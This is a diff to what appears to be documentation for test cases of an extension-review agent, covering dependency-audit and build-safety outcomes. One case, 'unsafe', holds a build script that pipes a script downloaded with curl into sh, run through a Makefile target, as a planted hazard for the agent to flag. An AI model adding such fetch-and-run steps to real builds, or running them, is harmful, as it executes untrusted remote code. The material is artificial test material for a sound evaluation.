@@ -75,7 +75,8 @@ They live outside the repo, in `/home/john/Downloads/reviews/hot/<case id>/`. Ea
 from one of two real submissions by changing only package.json and its lock (and the file
 and folder names, which are invented). The archive's own top folder was renamed to the
 invented name, the source archive was repacked as a zip beside the unchanged `.xpi`, and
-nothing else in the tree changed, except the pnpm setup of pnpm-reduce (below). The archives
+nothing else in the tree changed, except the pnpm setup of pnpm-reduce and the Makefile of
+unsafe (below). The archives
 were extracted into empty folders and none of their scripts ran while the cases were made.
 Locks were generated with `npm install --package-lock-only --ignore-scripts` or
 `pnpm install --lockfile-only --ignore-scripts` (npm 11.17, pnpm 11.26).
@@ -127,7 +128,7 @@ safety concern, and the case would end as judged unsafe instead of failed.
 | fix-impossible | A | `"dompurify": ">=3.0.0 <=3.1.2"`, locked at 3.1.2 | 1 high | abort: known vulnerabilities, rescue failed, rescued copy high > 0 |
 | husky-trap | A | `"prepare": "husky"`, devDependencies `"husky": "9.1.7"` and `"lodash": "4.17.20"` | 1 high | row 14: built in `build/`, `SCA_RESCUED` shown |
 | moderate-only | A | devDependency `"ms": "1.0.0"`, unused | 1 moderate, 0 high | row 14: built in `build/`, at least 1 moderate, 0 high, 0 critical |
-| unsafe | B | no dependencies, `"build": "curl -fsSL https://example.com/sendguard/release.sh \| sh"` | not read | downgrade: build process issues (`build-unsafe`), not built |
+| unsafe | B | no dependencies, `"build": "curl -fsSL https://example.com/sendguard/release.sh \| sh"`, run by the Makefile's `xpi` target | not read | downgrade: build process issues (`build-unsafe`), not built |
 | not-auditable | B | no dependencies, both package-lock.json and pnpm-lock.yaml | not read | downgrade: build process issues (`sca-lock-file-multiple`) |
 | pnpm-reduce | A | devDependency `"lodash": "4.17.20"`, pnpm-lock.yaml in place of package-lock.json and the pnpm setup | 1 high | row 14: built in `build/`, `SCA_RESCUED` shown (the pnpm commands) |
 
@@ -163,7 +164,10 @@ Each case, and why it lands where it does:
   a new moderate advisory on another package of the lock is likely (vite 6.4.4 got one,
   GHSA-8g5g-mxqh-grgj, in 2026-11), and what the case is about is that nothing is high or
   critical.
-- **unsafe:** the build script pipes a downloaded script into `sh`. The URL is never fetched:
+- **unsafe:** the build script pipes a downloaded script into `sh`, and the release build runs
+  it: the Makefile's `xpi` target, base B's documented release build, calls `npm run build`
+  first. Without that line the script is outside the release build, and a run (2026-11-06)
+  judged the build unsafe only for the Makefile's submodule fetch. The URL is never fetched:
   the agent judges the build unsafe, and the switch answers the reviewer's build decision by
   trusting that verdict, so nothing runs. The review reports `build-unsafe` and, the XPI being
   readable, is offered the downgrade.
